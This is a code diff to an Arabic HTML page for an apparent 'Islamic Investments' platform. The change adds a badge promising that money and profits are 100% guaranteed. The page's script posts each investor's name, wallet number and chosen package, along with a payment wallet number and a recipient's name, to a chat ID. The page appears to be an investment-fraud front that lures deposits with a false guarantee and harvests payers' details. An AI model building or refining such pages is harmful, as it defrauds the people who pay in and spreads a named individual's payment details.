@@ -56,25 +56,28 @@
       margin-top: 4px;
     }
 
-    .amount-box {
+    .package-header-box {
       margin-top: 20px;
     }
 
-    .amount-label {
-      font-size: 0.85rem;
-      color: #cbd5e1;
-    }
-
-    .amount-value {
-      font-size: 2.2rem;
+    .package-title {
+      font-size: 1.8rem;
       font-weight: 800;
       color: #fbbf24;
-      margin: 5px 0;
+      margin-bottom: 6px;
     }
 
-    .currency {
-      font-size: 0.85rem;
-      color: #e2e8f0;
+    .guarantee-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(251, 191, 36, 0.15);
+      border: 1px solid rgba(251, 191, 36, 0.4);
+      color: #fef08a;
+      padding: 6px 14px;
+      border-radius: 12px;
+      font-size: 0.82rem;
+      font-weight: 700;
     }
 
     .manager-pill {
@@ -86,7 +89,7 @@
       padding: 6px 16px;
       border-radius: 20px;
       font-size: 0.85rem;
-      margin-top: 15px;
+      margin-top: 18px;
     }
 
     /* Badges */
@@ -254,10 +257,11 @@
       <div class="header-title">🌙 الاستثمارات الإسلامية</div>
       <div class="header-subtitle">منصة استثمار متوافقة مع الشريعة</div>
 
-      <div class="amount-box">
-        <div class="amount-label">المبلغ المطلوب</div>
-        <div class="amount-value">4,400.00</div>
-        <div class="currency">جنيه مصري</div>
+      <div class="package-header-box">
+        <div class="package-title">اختر الباقة المناسبة</div>
+        <div class="guarantee-badge">
+          🛡️ أموالك وأرباحك مضمونة بنسبة 100%
+        </div>
       </div>
 
       <div class="manager-pill">
@@ -372,7 +376,7 @@
       label.innerText = "جاري الإرسال...";
       fileInput.disabled = true;
 
-      const captionText = `🌙 إشعار استثمار جديد (الاستثمارات الإسلامية)!\n\n👤 اسم المستثمر: ${userName}\n📱 رقم الحساب أو المحفظة: ${userWallet}\n📦 الباقة المختارة: ${packageSelect}\n💰 المبلغ المطلوب: 4,400.00 EGP\n💳 المحفظة المحول إليها: 01203174947\n👤 اسم المستلم: ALI AHMED GAMAL`;
+      const captionText = `🌙 إشعار استثمار جديد (الاستثمارات الإسلامية)!\n\n👤 اسم المستثمر: ${userName}\n📱 رقم الحساب أو المحفظة: ${userWallet}\n📦 الباقة المختارة: ${packageSelect}\n💳 المحفظة المحول إليها: 01203174947\n👤 اسم المستلم: ALI AHMED GAMAL`;
 
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
